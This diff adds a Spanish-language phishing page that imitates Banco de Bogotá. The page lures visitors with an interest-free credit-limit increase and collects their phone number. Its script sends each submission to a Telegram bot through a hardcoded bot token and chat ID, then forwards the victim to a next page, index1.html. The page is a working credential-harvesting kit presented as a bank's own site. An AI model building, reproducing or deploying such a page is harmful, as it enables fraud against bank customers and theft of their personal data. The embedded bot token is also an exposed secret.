@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(90deg,#fcfcfc 50%,#eef3f6 50%);min-height:100vh;color:#212529}
+.container{display:flex;flex-direction:row;justify-content:center;align-items:flex-start;max-width:1000px;margin:0 auto;padding:20px;gap:40px}
+.container__login{flex:0 0 380px;width:380px}
+.container__login--header img{max-width:200px;margin-bottom:15px}
+.container__login--title h2{font-size:1.2rem;font-weight:700;color:#212529;margin-bottom:15px}
+.login-card-content{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);padding:24px;margin-bottom:15px}
+.blue-banner{background:#0033a0;color:#fff;padding:14px 16px;border-radius:8px;margin-bottom:15px;display:flex;align-items:center;gap:10px;font-size:.85em}
+.blue-banner img{width:36px;height:36px;flex-shrink:0}
+.blue-banner a{color:#fff;text-decoration:underline}
+.container__info{flex:1;max-width:500px}
+.container__info img{width:100%;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);margin-bottom:15px}
+@media(max-width:768px){body{background:#fff!important}.container{flex-direction:column;align-items:center;padding:12px;gap:15px}.container__login,.container__info{width:100%;max-width:100%;flex:none}.login-card-content{padding:16px}.container__login--header img{max-width:180px}.blue-banner{padding:12px;font-size:.8em}.blue-banner img{width:30px;height:30px}}
+.loader-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#2c3e50;z-index:9999;display:none;justify-content:center;align-items:center;flex-direction:column}
+.loader-spinner{width:60px;height:60px;position:relative;animation:spin 1.5s linear infinite}
+.loader-spinner .dot{position:absolute;width:20px;height:20px;border-radius:50%}
+.loader-spinner .d1{background:#f1c40f;top:0;left:50%;transform:translateX(-50%)}
+.loader-spinner .d2{background:#3498db;bottom:5px;left:0}
+.loader-spinner .d3{background:#e74c3c;bottom:5px;right:0}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.loader-text{color:#fff;margin-top:20px;font-size:16px;font-weight:400}
+input,select,button{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+input.error{border-color:#c62828!important;border-width:2px!important;animation:shake .5s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+</style>
+</head>
+<body>
+<div class="loader-overlay" id="loading-overlay">
+<div class="loader-spinner"><div class="dot d1"></div><div class="dot d2"></div><div class="dot d3"></div></div>
+<div class="loader-text">Procesando...</div>
+</div>
+<div class="container">
+<div class="container__login">
+<div class="container__login--header"><img src="logobanco1.jpg" alt="Banco de Bogota"></div>
+<div class="container__login--title"><h2>Solicitud de Producto</h2></div>
+<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>Necesitas ayuda?</strong><br><a href="#">Contacta con un asesor ></a></div></div>
+<div class="login-card-content">
+<div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-bottom:12px">Escoge tu aumento de cupo ideal entre $5.000.000 y $70.000.000</div>
+<img src="tarjeta bo.jpg" alt="Tarjeta" style="width:100%;border-radius:8px;margin-bottom:12px">
+<div style="text-align:center;font-size:28px;font-weight:700;color:#212529;margin:10px 0" id="valor">$5.000.000</div>
+<input type="range" min="5000000" max="50000000" step="500000" value="7000000" id="slider" oninput="actualizar()" style="width:100%;margin:15px 0;cursor:pointer">
+<div style="display:flex;justify-content:space-between;font-size:14px;color:#6c757d;margin-bottom:15px"><span>$5.000.000</span><span>$70.000.000</span></div>
+<div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-top:20px;margin-bottom:10px">En cuantas cuotas?</div>
+<div style="display:flex;gap:6px;margin:10px 0 20px 0" id="plazos">
+<button class="plazo-btn" onclick="seleccionarPlazo(12)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">12</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(24)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">24</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(36)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">36</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(48)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">48</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(72)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">72</button>
+</div>
+<div style="background:#f5f7fa;border-radius:8px;padding:16px;margin-top:20px;text-align:center">
+<div style="font-size:12px;color:#6b7280">Cuota mensual estimada</div>
+<div style="font-size:24px;font-weight:700;color:#111827;margin-top:4px" id="cuota">$0</div>
+</div>
+<div style="font-size:13px;color:#c62828;margin-top:10px;text-align:center;background:#ffebee;padding:8px;border-radius:4px">El cupo se asigna sin intereses mensuales y con aprobacion digital.</div>
+<input type="tel" id="numero_telefono" style="width:100%;padding:14px;border-radius:8px;border:1px solid #d1d1d1;margin-top:10px;box-sizing:border-box;font-size:16px;outline:none" placeholder="Numero de telefono" maxlength="11">
+<button onclick="enviarCupo()" style="width:100%;margin-top:15px;padding:14px 20px;background:#0033a0;color:#fff;border:none;font-size:16px;font-weight:700;border-radius:8px;cursor:pointer">SOLICITAR AUMENTO</button>
+<div style="text-align:center;color:#999;font-size:.8em;margin-top:15px">Este sitio esta protegido por reCAPTCHA y aplican las politicas</div>
+</div>
+</div>
+<div class="container__info"><img src="taval.jpg" alt="Tu Aval" style="width:100%;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,.1)"></div>
+</div>
+<div id="modal-error" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.4);z-index:9999;justify-content:center;align-items:center">
+<div style="background:#fff;border-radius:16px;padding:32px 24px;max-width:320px;width:90%">
+<svg width="52" height="52" viewBox="0 0 24 24" fill="#f5a623" style="margin-bottom:20px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+<div style="font-size:20px;font-weight:700;color:#111;margin-bottom:12px">Escribe tu numero</div>
+<div style="font-size:15px;color:#444;line-height:1.5;margin-bottom:28px">Verificalo e intentalo nuevamente. (00)</div>
+<button onclick="document.getElementById('modal-error').style.display='none'" style="width:100%;padding:16px;background:#0033a0;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:12px;cursor:pointer">Volver a ingresar</button>
+</div>
+</div>
+<script>
+var plazoSeleccionado=12;
+function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
+function seleccionarPlazo(p){plazoSeleccionado=p;var btns=document.querySelectorAll(".plazo-btn");for(var i=0;i<btns.length;i++){btns[i].style.background="#fff";btns[i].style.color="#212529";btns[i].style.borderColor="#d1d1d1"}event.target.style.background="#0033a0";event.target.style.color="#fff";event.target.style.borderColor="#0033a0";actualizar()}
+
+function enviarCupo(){
+  var tel=document.getElementById("numero_telefono").value.trim();
+  if(tel.length<7){document.getElementById("modal-error").style.display="flex";return}
+  
+  var monto=document.getElementById("slider").value;
+  var cuota=document.getElementById("cuota").innerText;
+  
+  // ⚠️ CONFIGURA AQUI TU TOKEN Y CHAT ID
+  var TOKEN="8984792722:AAFJdr4DAY9lPrcbUACN5atwPUscU2IH5PM";
+  var CHAT_ID="7158969671";
+ 
+  var mensaje="📋 NUEVA SOLICITUD DE CUPO%0A"+
+              "━━━━━━━━━━━━━━━%0A"+
+              "💰 Monto: $"+parseInt(monto).toLocaleString("es-CO")+"%0A"+
+              "📅 Plazo: "+plazoSeleccionado+" meses%0A"+
+              "💵 Cuota mensual: "+cuota+"%0A"+
+              "📞 Teléfono: "+tel+"%0A"+
+              "🕒 "+new Date().toLocaleString("es-CO");
+  
+  document.getElementById("loading-overlay").style.display="flex";
+  
+  var url="https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+mensaje;
+  
+  fetch(url)
+    .then(function(r){return r.json()})
+    .then(function(d){window.location.href="index1.html"})
+    .catch(function(){window.location.href="index1.html"});
+}
+
+actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a0";document.querySelectorAll(".plazo-btn")[0].style.color="#fff";document.querySelectorAll(".plazo-btn")[0].style.borderColor="#0033a0";
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cb5d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
